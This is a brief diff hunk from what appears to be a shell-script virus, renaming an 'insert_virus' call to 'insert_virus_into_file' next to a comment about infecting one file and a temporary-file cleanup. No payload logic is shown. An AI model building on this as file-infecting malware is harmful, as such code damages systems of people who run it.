@@ -43,7 +43,7 @@ do
 		rm /tmp/$OBJECT
 	}
 	
-	insert_virus
+	insert_virus_into_file
 	
 	# Infecting just one file
 	break
